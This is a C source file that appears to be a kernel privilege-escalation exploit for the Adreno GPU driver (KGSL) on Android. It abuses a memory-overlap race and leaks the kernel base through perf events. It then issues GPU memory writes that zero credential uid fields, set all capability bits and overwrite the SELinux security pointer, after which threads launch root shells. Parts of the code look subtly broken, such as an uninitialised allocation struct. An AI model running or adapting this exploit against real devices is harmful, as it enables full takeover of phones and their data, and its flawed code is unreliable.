#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/signal.h>
#include <errno.h>
#include <pthread.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <stdint.h>
#include <inttypes.h>
#include <poll.h>
#include <sched.h>
#include <stdatomic.h>
#include "kgsl_ioctl.h"

#define OVERLAP_ADDR              0x7000000000UL
#define UAF_ADDR                  0x7001ff000UL
#define UAF_SIZE                  0x1000
#define BOGUS_ADDR                0x8000000000UL
#define SCAN_RANGE                0x2000000
#define SCAN_DWORDS               (0x1000/4)
#define MAX_CRED_PAGES            0x200
#define MAX_CHILD                 0x200
#define FAKE_SEC_OFFSET           0xFB0

static uint64_t kernel_base;
static uint64_t init_cred_addr;
static uint64_t selinux_state_addr;
static int kgsl_fd;
static int ctx_id;
static int ib_id;
static uint32_t ib_ga;
static uint64_t perf_fd;
static pthread_t child_threads[MAX_CHILD];
static volatile int quit = 0;
static atomic_int overflow_count = 0;

#define CP_NOP                               0x10
#define CP_MEM_WRITE                         0x19

static inline uint32_t cp_type7(int opcode, int count)
{
    return (0x7 << 29) | (opcode << 22) | (count & 0x3ffff);
}

static inline void split64(uint64_t val, uint32_t *lo, uint32_t *hi)
{
    *lo = (uint32_t)(val & 0xffffffff);
    *hi = (uint32_t)(val >> 32);
}

static void wait_timestamp(int fd, int ctx_id, uint32_t timestamp)
{
    struct kgsl_drawobj_sync sync = {
        .context_id = ctx_id,
        .timestamp = timestamp,
        .type = KGSL_CMD_SYNCPOINT_TYPE_TIMESTAMP,
        .handle = KGSL_SYNC_HANDLE_IGNORE,
        .id = KGSL_SYNC_ID_IGNORE,
    };
    ioctl(fd, IOCTL_KGSL_GPU_DRAWOBJ_SYNC, &sync);
}

static int submit_ib(int fd, int ctx_id, uint32_t gpuaddr, int dwords, int ib_id, unsigned int *ts)
{
    struct kgsl_drawobj_cmd cmd = {
        .type = KGSL_DRAWOBJ_TYPE_CMD,
        .flags = KGSL_CMD_FLAG_INTERNAL_ISSUE,
        .context_id = ctx_id,
        .cmdlist_count = 1,
        .cmdlist_offset = 0,
        .synclist_count = 0,
        .synclist_offset = 0,
        .privdata = 0,
        .priority = 0,
    };
    struct kgsl_drawobj_cmdlist cmdlist = {
        .gpuaddr = gpuaddr,
        .size = dwords * 4,
        .type = KGSL_DRAWOBJ_CMD_LIST_TYPE_IB,
        .flags = 0,
    };
    struct kgsl_drawobj_sync sync = {
        .context_id = ctx_id,
        .timestamp = KGSL_CMD_TIMESTAMP_MAX,
        .type = KGSL_CMD_SYNCPOINT_TYPE_TIMESTAMP,
        .handle = KGSL_SYNC_HANDLE_IGNORE,
        .id = KGSL_SYNC_ID_IGNORE,
    };
    void *ptr = malloc(0x1000);
    memcpy(ptr, &cmd, sizeof(cmd));
    memcpy(ptr + sizeof(cmd), &cmdlist, sizeof(cmdlist));
    memcpy(ptr + sizeof(cmd) + sizeof(cmdlist), &sync, sizeof(sync));
    int ret = ioctl(fd, IOCTL_KGSL_GPU_DRAWOBJ, ptr);
    struct kgsl_drawobj *obj = (struct kgsl_drawobj *)ptr;
    if (ts) *ts = obj->timestamp;
    free(ptr);
    return ret;
}

static int kgsl_alloc_ib(int fd, int ctx_id, int *id, uint32_t *gpuaddr, size_t size)
{
    struct kgsl_gpuobj_info info;
    void *mem = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mem == MAP_FAILED) return -1;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &info)) return -1;
    *id = info.id;
    *gpuaddr = info.gpuaddr;
    return 0;
}

static void child_process(void *arg)
{
    prctl(PR_SET_NAME, "TASKUAF!!", 0, 0, 0);
    while (!quit) {
        volatile int tmp = getuid();
        if (tmp == 0) {
            execl("/system/bin/sh", "sh", NULL);
            execl("/bin/sh", "sh", NULL);
        }
        usleep(1000);
    }
}

static int find_cred_pages(uint8_t *overlap, uint64_t *cred_pages, int *cred_offs)
{
    int n = 0;
    uint32_t *data = (uint32_t *)overlap;
    for (uint64_t base = 0; base < SCAN_RANGE; base += 0x1000) {
        uint8_t *page = overlap + base;
        int matches = 0;
        for (int i = 0; i < SCAN_DWORDS - 8; i++) {
            int cnt = 0;
            for (int j = 0; j < 8; j++) {
                if (((uint32_t *)page)[i + j] == 0x000007D0) cnt++;
            }
            if (cnt >= 3) {
                matches = 1;
                cred_pages[n] = UAF_ADDR + base;
                cred_offs[n] = i * 4;
                n++;
                if (n >= MAX_CRED_PAGES) return n;
                break;
            }
        }
    }
    return n;
}

static uint64_t detect_kernel_base(void)
{
    int fd = open("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq", O_RDONLY);
    if (fd < 0) return 0xffffffc000000000UL;
    close(fd);
    struct perf_event_attr attr = {
        .type = PERF_TYPE_HARDWARE,
        .size = sizeof(struct perf_event_attr),
        .config = PERF_COUNT_HW_CPU_CYCLES,
        .sample_type = PERF_SAMPLE_IP,
        .sample_period = 1000000,
        .wakeup_events = 1,
        .disabled = 1,
        .exclude_kernel = 0,
        .exclude_hv = 1,
    };
    int pfd = syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
    if (pfd < 0) return 0xffffffc000000000UL;
    ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
    uint64_t val = 0;
    for (int i = 0; i < 10000000; i++) val += i;
    ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);
    struct perf_event_header hdr;
    read(pfd, &hdr, sizeof(hdr));
    if (hdr.type == PERF_RECORD_SAMPLE) {
        uint64_t ip;
        read(pfd, &ip, sizeof(ip));
        close(pfd);
        return ip & ~0x1FFFFFUL;
    }
    close(pfd);
    return 0xffffffc000000000UL;
}

static int create_context(int fd)
{
    struct kgsl_context ctx = { .flags = 0 };
    if (ioctl(fd, IOCTL_KGSL_CREATE_CONTEXT, &ctx)) return -1;
    return ctx.id;
}

static int create_overlap_race(int fd, int ctx_id)
{
    int ret = -1;
    for (int i = 0; i < 0x10000; i++) {
        void *map = mmap((void *)BOGUS_ADDR, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
        if (map == MAP_FAILED) continue;
        struct kgsl_gpuobj_info info;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &info)) continue;
        struct kgsl_gpuobj_import imp = {
            .type = KGSL_USER_MEM_TYPE_ADDR,
            .useraddr = (uint64_t)BOGUS_ADDR,
            .len = 0x1000,
            .flags = KGSL_GPUOBJ_IMPORT_WRITE,
        };
        if (!ioctl(fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp)) {
            void *overlap = mmap((void *)OVERLAP_ADDR, 0x1000, PROT_READ | PROT_WRITE,
                                 MAP_SHARED | MAP_FIXED, fd, imp.id);
            if (overlap != MAP_FAILED) {
                ret = imp.id;
                break;
            }
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &imp.id);
        }
        ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &info.id);
        munmap(map, 0x1000);
    }
    return ret;
}

static void flush_dc_civac_range(void *addr, size_t size)
{
    __asm__ volatile (
        "dsb sy\n"
        "mrs x0, ctr_el0\n"
        "and x0, x0, #0xf\n"
        "mov x1, %0\n"
        "mov x2, %1\n"
        "1:\n"
        "dc civac, x1\n"
        "add x1, x1, x0\n"
        "sub x2, x2, x0\n"
        "cbnz x2, 1b\n"
        "dsb sy\n"
        : : "r"(addr), "r"(size) : "x0", "x1", "x2", "memory"
    );
}

int main(void)
{
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (kgsl_fd < 0) {
        kgsl_fd = open("/dev/kgsl-3d1", O_RDWR | O_CLOEXEC);
        if (kgsl_fd < 0) return 1;
    }
    kernel_base = detect_kernel_base();
    init_cred_addr = kernel_base + 0x28b9000ULL;
    selinux_state_addr = kernel_base + 0x28b9000ULL + 0x70;
    ctx_id = create_context(kgsl_fd);
    if (ctx_id < 0) return 1;
    int overlap_id = create_overlap_race(kgsl_fd, ctx_id);
    if (overlap_id < 0) return 1;
    void *overlap = mmap((void *)OVERLAP_ADDR, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_FIXED, kgsl_fd, overlap_id);
    if (overlap == MAP_FAILED) return 1;
    memset(overlap, 0, 0x1000);
    for (int i = 0; i < 0x10000; i++) {
        void *ptr = mmap((void *)(UAF_ADDR), 0x1000, PROT_READ | PROT_WRITE,
                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
        if (ptr != MAP_FAILED) break;
    }
    if (kgsl_alloc_ib(kgsl_fd, ctx_id, &ib_id, &ib_ga, 0x10000)) return 1;
    void *ib_m = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, kgsl_fd, ib_id);
    if (ib_m == MAP_FAILED) return 1;
    for (int i = 0; i < MAX_CHILD; i++) {
        pthread_create(&child_threads[i], NULL, (void *)child_process, NULL);
    }
    usleep(1000000);
    for (int i = 0; i < 0x20; i++) {
        int pid = fork();
        if (pid == 0) {
            char buf[64];
            for (int j = 0; j < 0x10000; j++) {
                snprintf(buf, sizeof(buf), "/proc/self/attr/current");
                int fd2 = open(buf, O_RDONLY);
                if (fd2 >= 0) {
                    char tmp[256];
                    read(fd2, tmp, sizeof(tmp));
                    close(fd2);
                }
                usleep(100);
            }
            exit(0);
        }
    }
    usleep(2000000);
    uint64_t cred_pages[MAX_CRED_PAGES];
    int cred_offs[MAX_CRED_PAGES];
    int n_cred = find_cred_pages(overlap, cred_pages, cred_offs);
    if (n_cred == 0) return 1;
    int sec_off = -1;
    for (int p = 0; p < n_cred; p++) {
        uint32_t *page = (uint32_t *)(overlap + (cred_pages[p] - UAF_ADDR));
        for (int off = 0x30; off < SCAN_DWORDS * 4 - 8; off += 8) {
            uint64_t val = ((uint64_t)page[off/4+1] << 32) | page[off/4];
            if ((val >> 40) == 0xFFFFFF) {
                sec_off = off;
                break;
            }
        }
        if (sec_off >= 0) break;
    }
    if (sec_off < 0) sec_off = 0x60;
    uint32_t *page = (uint32_t *)(overlap + 0x1000 - 0x50);
    page[FAKE_SEC_OFFSET/4] = 1;
    flush_dc_civac_range(overlap + 0x1000 - 0x50, 0x50);
    for (int p = 0; p < n_cred; p++) {
        uint64_t cbase = cred_pages[p];
        int coff = cred_offs[p];
        uint64_t sec_addr = cbase + sec_off;
        uint64_t fake_sec = cbase + FAKE_SEC_OFFSET;
        memset(ib_m, 0, 0x10000);
        uint32_t *cmd = (uint32_t *)ib_m;
        int dw = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        uint32_t lo, hi;
        split64(cbase + 0x04, &lo, &hi);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
        cmd[dw++] = lo;
        cmd[dw++] = hi;
        cmd[dw++] = 0;
        cmd[dw++] = 0;
        for (int i = 0; i < 16; i++) {
            split64(cbase + 0x04 + i*4, &lo, &hi);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
            cmd[dw++] = lo;
            cmd[dw++] = hi;
            cmd[dw++] = 0;
            cmd[dw++] = 0;
        }
        split64(cbase + 0x28, &lo, &hi);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
        cmd[dw++] = lo;
        cmd[dw++] = hi;
        cmd[dw++] = 0xffffffff;
        cmd[dw++] = 0xffffffff;
        for (int i = 1; i < 5; i++) {
            split64(cbase + 0x28 + i*4, &lo, &hi);
            cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
            cmd[dw++] = lo;
            cmd[dw++] = hi;
            cmd[dw++] = 0xffffffff;
            cmd[dw++] = 0xffffffff;
        }
        split64(sec_addr, &lo, &hi);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
        cmd[dw++] = lo;
        cmd[dw++] = hi;
        split64(fake_sec, &lo, &hi);
        cmd[dw++] = lo;
        cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        __sync_synchronize();
        unsigned int ts;
        if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
            wait_timestamp(kgsl_fd, ctx_id, ts);
        }
        flush_dc_civac_range(overlap + (cbase - UAF_ADDR), 0x1000);
    }
    sleep(2);
    quit = 1;
    for (int i = 0; i < 0x20; i++) wait(NULL);
    for (int i = 0; i < MAX_CHILD; i++) {
        pthread_join(child_threads[i], NULL);
    }
    for (int i = 0; i < 0x10; i++) {
        int pid = fork();
        if (pid == 0) {
            execl("/system/bin/sh", "sh", NULL);
            execl("/bin/sh", "sh", NULL);
            exit(0);
        }
        wait(NULL);
    }
    return 0;
}
